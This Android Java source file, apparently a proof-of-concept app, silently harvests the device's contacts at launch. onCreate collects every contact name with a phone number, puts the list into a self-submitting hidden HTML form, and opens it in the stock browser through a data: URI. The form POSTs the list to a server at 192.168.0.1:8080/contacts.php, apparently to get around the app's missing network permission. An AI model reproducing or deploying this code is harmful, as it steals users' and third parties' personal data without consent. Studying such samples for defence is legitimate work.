package com.example.flymaple.test9;

import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;

import java.net.URLEncoder;


public class MainActivity extends ActionBarActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        onClickSend();
    }

    public void onClickSend(){
        ContentResolver cr = getContentResolver();
        String result = "";
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                result = result + name + ": ";
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {

                    // get the phone number
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phone = pCur.getString(
                                pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                          /*
                          if(pCur.isLast())
                        	  result = result + phone;
                          else
                        	  result = result + phone + ", ";
                        	  */
                        if(pCur.isFirst())
                            result = result + phone;
                        else
                            ;
                    }
                    pCur.close();
                }
                result = result + "\n";
            }
        }

        String html = writeToHTML(result,"192.168.0.1".toString(),"8080".toString());

        browserPOST(html);
    }

    private String writeToHTML(String contactList, String IP, String port){
        String IPandPort = IP + ":" + port + "\\contacts.php";
        String html = "<html><body onLoad=\"document.getElementById('form').submit()\"><form id=\"form\" target=\"_self\" method=\"POST\" action=\"http:\\\\" + IPandPort +
                "\"><input type=\"hidden\" name=\"contactList\" value=\"" + contactList +
                "\" /></form></body></html>";
        return html;
    }

    private void browserPOST(String html) {
        Intent i = new Intent();
        // MUST instantiate android browser, otherwise it won't work (it won't find an activity to satisfy intent)
        i.setComponent(new ComponentName("com.android.browser", "com.android.browser.BrowserActivity"));
        i.setAction(Intent.ACTION_VIEW);

        // URLEncoder.encode replace space with "+", must replace again with %20
        String dataUri = "data:text/html," + URLEncoder.encode(html).replaceAll("\\+","%20");
        i.setData(Uri.parse(dataUri));
        startActivity(i);
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
